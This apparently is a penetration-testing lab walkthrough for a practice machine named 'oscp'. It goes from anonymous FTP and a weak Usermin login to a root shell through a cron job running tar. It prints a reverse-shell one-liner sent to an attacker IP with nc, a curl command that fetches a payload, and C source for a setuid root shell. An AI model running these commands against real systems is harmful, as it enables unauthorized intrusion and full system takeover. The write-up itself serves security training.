 ## Takeaway
## Metadata
- Port `21` FTP allows anonymous login
	- After retrieving 5 `.pdf` file, one can use `exiftool` to discover potentially 3 users: `cassie`, `makr`, `robert`.![[Pasted image 20240313142936.png]]![[Pasted image 20240313143033.png]]
- Port `20000` redirects to `https://oscp:20000` which is a login page for `Usermin`instance.
	- Adding `192.168.242.157 oscp` to `/etc/hosts`
	- Credential `cassie:cassie` can be used to login as a valid user.
- `linpeas` will identify a `cron job` is ran as `root` every 2 minutes. 
	- The exact command ran is `cd /opt/admin && tar -zxf /tmp/backup.tar.gz *`.![[Pasted image 20240313162715.png]]
	- We have `write` permission on `/opt/admin` since we own the directory.
# Exploitation
## Shell as cassie
- Login as `cassie`, navigate to `https://oscp:20000/shell/?xnavigation=1` and run `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.242 443 >/tmp/f` to receive a reverse shell as `cassie`.![[Pasted image 20240313144137.png]]
- ![[Pasted image 20240313164354.png]]
# PrivEsc
- Create a file called `shell.c` containing following code:
```c
#include <unistd.h>
int main(void){
  setresuid(0, 0, 0);
  system("/bin/bash -p");
}
```
- On attaker machine generate payload with `sudo gcc shell.c -o shell -static;sudo chmod u+s shell;tar -zcf backup.tar.gz shell`.
- Set up python webserver and, on target, run `cd /tmp;curl -O http://192.168.45.242:1234/backup.tar.gz` to retrieve the payload onto `/tmp` directory.
	- Since the `cron job` run `tar -zxf /tmp/backup.tar.gz *`, we need to run `touch /opt/admin/shell` to ensure the archive extracts properly.
- Wait for the `cron job` and run `cd /opt/admin;./shell` to obtain a root shell.
- ![[Pasted image 20240313162641.png]]